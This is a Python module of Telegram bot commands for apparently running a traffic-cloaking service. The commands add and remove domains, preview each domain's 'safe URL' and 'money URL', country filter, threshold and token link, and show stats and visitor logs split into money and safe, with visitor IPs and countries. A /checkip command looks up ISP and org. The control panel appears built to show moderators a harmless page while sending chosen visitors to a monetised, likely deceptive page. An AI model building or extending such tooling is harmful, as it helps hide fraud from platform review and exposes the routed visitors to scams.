"""
/adddomain    example.com
/removedomain example.com
/listdomains
/previewflow  example.com
/stats        example.com
/logs         example.com
/checkip      1.2.3.4
"""
import ipaddress
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from core.domain_manager import (
    add_domain, remove_domain, get_all_domains, require_domain,
    get_active_links, token_url,
)
from core.ipgeo import lookup as geo_lookup
from db.models import visit_stats, visit_logs


async def cmd_adddomain(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/adddomain example.com`", parse_mode="Markdown")
        return
    domain = ctx.args[0].lower()
    if add_domain(domain):
        await update.message.reply_text(f"✅ Domain `{domain}` added.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"⚠️ Domain `{domain}` already exists.", parse_mode="Markdown")


async def cmd_removedomain(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/removedomain example.com`", parse_mode="Markdown")
        return
    domain = ctx.args[0].lower()
    if remove_domain(domain):
        await update.message.reply_text(f"🗑 Domain `{domain}` removed.", parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ Domain `{domain}` not found.", parse_mode="Markdown")


async def cmd_listdomains(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    rows = get_all_domains()
    if not rows:
        await update.message.reply_text("No domains configured yet.")
        return
    lines = "\n".join(f"• `{r['domain']}`" for r in rows)
    await update.message.reply_text(f"*Domains:*\n{lines}", parse_mode="Markdown")


async def cmd_previewflow(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/previewflow example.com`", parse_mode="Markdown")
        return
    domain = ctx.args[0].lower()
    try:
        row = require_domain(domain)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return

    tokens = get_active_links(domain)
    t_url = token_url(domain, tokens[0]["token"]) if tokens else "_no token yet — use /generate_"
    countries = row["countries"] or "_(not set)_"
    safe  = row["safe_url"]  or "_(not set)_"
    money = row["money_url"] or "_(not set)_"
    status = "✅ Active" if (row["safe_url"] and row["money_url"] and tokens) else "⚠️ Incomplete setup"

    text = (
        f"*Preview: `{domain}`*\n\n"
        f"Domain    : `{domain}`\n"
        f"Safe URL  : {safe}\n"
        f"Money URL : {money}\n"
        f"Countries : {countries}\n"
        f"Threshold : {row['threshold']}\n"
        f"Token URL : {t_url}\n"
        f"Status    : {status}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/stats example.com`", parse_mode="Markdown")
        return
    domain = ctx.args[0].lower()
    try:
        require_domain(domain)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    s = visit_stats(domain)
    text = (
        f"*Stats: `{domain}`*\n\n"
        f"Total visits : {s['total']}\n"
        f"→ Money      : {s['money']}\n"
        f"→ Safe       : {s['safe']}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/logs example.com`", parse_mode="Markdown")
        return
    domain = ctx.args[0].lower()
    try:
        require_domain(domain)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return
    rows = visit_logs(domain, limit=15)
    if not rows:
        await update.message.reply_text(f"No logs for `{domain}` yet.", parse_mode="Markdown")
        return
    lines = "\n".join(
        f"`{r['created_at'][:16]}` | {'🟢' if r['action']=='money' else '🔴'} | {r['country_code'] or '??'} | {r['ip']}"
        for r in rows
    )
    await update.message.reply_text(f"*Logs for `{domain}` (last 15):*\n{lines}", parse_mode="Markdown")


async def cmd_checkip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/checkip 1.2.3.4`", parse_mode="Markdown")
        return
    ip = ctx.args[0]
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        await update.message.reply_text("❌ Invalid IP address.")
        return
    info = geo_lookup(ip)
    if not info:
        await update.message.reply_text("❌ Could not retrieve IP info.")
        return
    text = (
        f"*IP Info: `{ip}`*\n\n"
        f"Country : {info.get('country', 'N/A')} ({info.get('country_code', '?')})\n"
        f"ISP     : {info.get('isp', 'N/A')}\n"
        f"Org     : {info.get('org', 'N/A')}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


def register(app):
    app.add_handler(CommandHandler("adddomain",    cmd_adddomain))
    app.add_handler(CommandHandler("removedomain", cmd_removedomain))
    app.add_handler(CommandHandler("listdomains",  cmd_listdomains))
    app.add_handler(CommandHandler("previewflow",  cmd_previewflow))
    app.add_handler(CommandHandler("stats",        cmd_stats))
    app.add_handler(CommandHandler("logs",         cmd_logs))
    app.add_handler(CommandHandler("checkip",      cmd_checkip))
